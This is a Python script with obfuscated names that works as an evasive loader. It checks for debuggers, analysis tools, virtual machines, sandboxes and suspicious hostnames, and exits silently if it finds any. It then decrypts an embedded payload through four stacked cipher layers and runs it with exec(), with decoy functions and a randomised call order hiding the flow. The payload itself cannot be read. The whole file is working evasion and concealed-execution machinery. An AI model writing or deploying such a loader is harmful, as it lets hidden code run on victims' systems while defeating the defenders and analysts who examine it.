#!/usr/bin/env python3
import sys, os, time, threading, gc, platform, socket, random, secrets, base64, hashlib
from datetime import datetime
from Crypto.Cipher import AES, ChaCha20, Salsa20
from Crypto.Protocol.KDF import scrypt

o_I_l0_loO0lIlI0oOI0 = bytes.fromhex('eb8a8e760273125475d52405316f57acffc53e5cd816451f2bac8bb6c8f9f8eb3e613d2ac4ecd80f193636aa2860925ffc2791f9650407fe928b00a04ef41efe')
oOIIIIOI0olIl0o_O0oI = 0
loO0l0I1lO_I0olIl0Ol = [secrets.randbits(64) for _ in range(12)]
OoII1lO_IoIl0OIl0OIl = {'last_check': time.time(), 'violations': 0, 'session_start': time.time()}
O_ooIlI0o0O0oIOl0oOI = [threading.Event() for _ in range(3)]

def l_oO0lI1lOl0oOlOloI0():
    global loO0l0I1lO_I0olIl0Ol, OoII1lO_IoIl0OIl0OIl
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        loO0l0I1lO_I0olIl0Ol[0] ^= 0xDEADBEEF
        os._exit(random.randint(1, 255))
    try:
        frame = sys._getframe()
        if frame.f_trace is not None or frame.f_back.f_trace is not None:
            os._exit(random.randint(1, 255))
    except:
        pass
    measurements = []
    for _ in range(5):
        start = time.perf_counter_ns()
        dummy = sum(i * random.randint(1, 100) for i in range(3000))
        elapsed = time.perf_counter_ns() - start
        measurements.append(elapsed)
    avg_time = sum(measurements) / len(measurements)
    if avg_time > 150_000_000 or max(measurements) > 300_000_000:
        os._exit(random.randint(1, 255))
    obj_count = len(gc.get_objects())
    if obj_count > 500000 or obj_count < 500:
        os._exit(random.randint(1, 255))
    suspicious_env = ['PYTHONDEBUG', 'PYTHONINSPECT', 'PYTHONHOME', '_DEBUG']
    if any(var in os.environ for var in suspicious_env):
        os._exit(random.randint(1, 255))
    try:
        import psutil
        current_proc = psutil.Process()
        if current_proc.memory_info().rss > 2 * 1024 * 1024 * 1024:
            os._exit(random.randint(1, 255))
        parent = current_proc.parent()
        if parent and any(debugger in parent.name().lower() 
                         for debugger in ['ida', 'olly', 'x64dbg', 'ghidra', 'radare', 'gdb']):
            os._exit(random.randint(1, 255))
        dangerous_processes = [
            'ida', 'ida64', 'ollydbg', 'x32dbg', 'x64dbg', 'windbg', 'ghidra',
            'radare2', 'r2', 'gdb', 'lldb', 'wireshark', 'processhacker',
            'cheatengine', 'artmoney', 'debugview', 'procmon', 'regmon',
            'filemon', 'apimonitor', 'detours', 'apihook', 'hookapi'
        ]
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            if any(tool in proc_name for tool in dangerous_processes):
                os._exit(random.randint(1, 255))
    except ImportError:
        pass
    except:
        pass
    OoII1lO_IoIl0OIl0OIl['last_check'] = time.time()
    loO0l0I1lO_I0olIl0Ol[random.randint(0, len(loO0l0I1lO_I0olIl0Ol)-1)] ^= random.randint(1, 0xFFFF)

def ooIIoIo_OIl0Ol1OoI_I():
    vm_signatures = [
        'vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels',
        'hyperv', 'hyper-v', 'kvm', 'bochs', 'wine', 'docker', 
        'kubernetes', 'sandboxie', 'cuckoo', 'anubis', 'joebox',
        'threatexpert', 'cwsandbox', 'comodo', 'sunbelt', 'gfi'
    ]
    system_info = (platform.system() + platform.machine() + 
                  platform.processor() + platform.platform()).lower()
    if any(sig in system_info for sig in vm_signatures):
        os._exit(random.randint(1, 255))
    try:
        hostname = socket.gethostname().lower()
        suspicious_hostnames = vm_signatures + [
            'sandbox', 'malware', 'analysis', 'test', 'victim', 'sample',
            'honeypot', 'research', 'analyst', 'reverse', 'debug'
        ]
        if any(name in hostname for name in suspicious_hostnames):
            os._exit(random.randint(1, 255))
    except:
        pass
    try:
        start = time.perf_counter()
        for _ in range(200000):
            _ = random.random() ** 0.5
        cpu_time = time.perf_counter() - start
        if cpu_time > 1.0:
            os._exit(random.randint(1, 255))
        start = time.perf_counter()
        data = [random.randint(0, 1000000) for _ in range(50000)]
        data.sort()
        memory_time = time.perf_counter() - start
        if memory_time > 0.5:
            os._exit(random.randint(1, 255))
    except:
        pass
    vm_files = [
        '/proc/vz', '/proc/bc', '/.dockerenv', '/.dockerinit',
        '/usr/bin/VBoxControl', '/usr/bin/VBoxService',
        'C:\\windows\\system32\\drivers\\VBoxMouse.sys',
        'C:\\windows\\system32\\drivers\\vmhgfs.sys'
    ]
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            os._exit(random.randint(1, 255))

def oo0I0oll1OoooIO0oIl1(purpose: str, length: int) -> bytes:
    global o_I_l0_loO0lIlI0oOI0
    salt = hashlib.sha256(purpose.encode()).digest()
    key_material = o_I_l0_loO0lIlI0oOI0
    return scrypt(key_material, salt, length, N=2**16, r=8, p=1)

def IoIoOI0ol00l1Oo_l1Oo(data: bytes) -> bytes:
    try:
        aes_key = oo0I0oll1OoooIO0oIl1("AES_LAYER", 32)
        chacha_key = oo0I0oll1OoooIO0oIl1("CHACHA_LAYER", 32)
        salsa_key = oo0I0oll1OoooIO0oIl1("SALSA_LAYER", 32)
        xor_key = oo0I0oll1OoooIO0oIl1("XOR_LAYER", 256)
        salsa_nonce = data[:8]
        encrypted_data = data[8:]
        xor_decrypted = bytes(a ^ b for a, b in zip(encrypted_data,
                            (xor_key * (len(encrypted_data) // len(xor_key) + 1))[:len(encrypted_data)]))
        salsa_cipher = Salsa20.new(key=salsa_key, nonce=salsa_nonce)
        chacha_data = salsa_cipher.decrypt(xor_decrypted)
        chacha_nonce = chacha_data[:12]
        chacha_encrypted = chacha_data[12:]
        chacha_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
        aes_data = chacha_cipher.decrypt(chacha_encrypted)
        aes_nonce = aes_data[:16]
        aes_tag = aes_data[16:32]
        aes_encrypted = aes_data[32:]
        aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=aes_nonce)
        return aes_cipher.decrypt_and_verify(aes_encrypted, aes_tag)
    except Exception:
        os._exit(random.randint(1, 255))

def oI1lOollI0ooOIl0Ol0o():
    global oOIIIIOI0olIl0o_O0oI, loO0l0I1lO_I0olIl0Ol, OoII1lO_IoIl0OIl0OIl
    expected_violations = OoII1lO_IoIl0OIl0OIl.get('violations', 0)
    current_violations = sum(1 for canary in loO0l0I1lO_I0olIl0Ol if canary & 0xFFFF == 0)
    if abs(current_violations - expected_violations) > 5:
        os._exit(random.randint(1, 255))
    pass
    oOIIIIOI0olIl0o_O0oI += 1
    pass
    session_duration = time.time() - OoII1lO_IoIl0OIl0OIl.get('session_start', time.time())
    if session_duration > 172800:
        os._exit(random.randint(1, 255))


def ol1OoI_l0_OIl00ol0Il():
    while True:
        sleep_time = random.uniform(1.5, 4.0)
        time.sleep(sleep_time)
        try:
            l_oO0lI1lOl0oOlOloI0()
            ooIIoIo_OIl0Ol1OoI_I()
            oI1lOollI0ooOIl0Ol0o()
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(loO0l0I1lO_I0olIl0Ol) - 1)
                loO0l0I1lO_I0olIl0Ol[idx] ^= random.randint(1, 0xFFFFFFFF)
        except:
            os._exit(random.randint(1, 255))

def I0o0Ol_OOIl0OlI0ooO0():
    try:
        l_oO0lI1lOl0oOlOloI0()
        ooIIoIo_OIl0Ol1OoI_I()
        oI1lOollI0ooOIl0Ol0o()
        O_ooIlI0o0O0oIOl0oOI[0].set()
        oloOIl0_IOlIl0oOIIIl = base64.b64decode('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')
        O_Il1Ool0ollI0oo_O0o = IoIoOI0ol00l1Oo_l1Oo(oloOIl0_IOlIl0oOIIIl)
        exec(O_Il1Ool0ollI0oo_O0o.decode(), {'__name__': '__main__', '__file__': __file__})
    except Exception:
        os._exit(random.randint(1, 255))

def llI0oIl1OoIIl0oO_ool():
    fake_key = secrets.token_bytes(32)
    fake_data = base64.b64encode(secrets.token_bytes(2048)).decode()
    time.sleep(random.uniform(0.005, 0.025))
    return hashlib.sha512(fake_data.encode() + fake_key).hexdigest()

def ooO0lO0l0oO_oloIIO_l():
    operations = random.randint(100, 500)
    for i in range(operations):
        _ = secrets.randbits(64) ^ secrets.randbits(64)
        _ = random.randint(0, 2**32) * random.randint(0, 2**16)
    return secrets.token_hex(32)

def olIl0oOIol0oOoo0OlO0():
    fake_metrics = {
        'entropy': random.uniform(7.8, 8.0),
        'compression_ratio': random.uniform(0.25, 0.75),
        'pattern_count': random.randint(50, 200),
        'signature_matches': [secrets.token_hex(16) for _ in range(random.randint(3, 12))],
        'complexity_score': random.uniform(0.85, 0.99)
    }
    time.sleep(random.uniform(0.01, 0.05))
    return fake_metrics

def O0_o0OloIoolI0oOIl0o():
    fake_vm_checks = [
        'vmware_detection_passed',
        'virtualbox_detection_passed', 
        'qemu_detection_passed',
        'sandbox_detection_passed'
    ]
    return all(check for check in fake_vm_checks)

if __name__ == "__main__":
    monitor_thread = threading.Thread(target=ol1OoI_l0_OIl00ol0Il, daemon=True)
    monitor_thread.start()
    time.sleep(random.uniform(0.005, 0.1))
    decoy_functions = [llI0oIl1OoIIl0oO_ool, ooO0lO0l0oO_oloIIO_l, olIl0oOIol0oOoo0OlO0, O0_o0OloIoolI0oOIl0o]
    random.shuffle(decoy_functions)
    execution_pattern = random.randint(1, 4)
    if execution_pattern == 1:
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        I0o0Ol_OOIl0OlI0ooO0()
        decoy_functions[1]()
    elif execution_pattern == 2:
        decoy_functions[1]()
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        I0o0Ol_OOIl0OlI0ooO0()
    elif execution_pattern == 3:
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        I0o0Ol_OOIl0OlI0ooO0()
        decoy_functions[3]()
        decoy_functions[0]()
    else:
        decoy_functions[3]()
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        I0o0Ol_OOIl0OlI0ooO0()
        decoy_functions[1]()
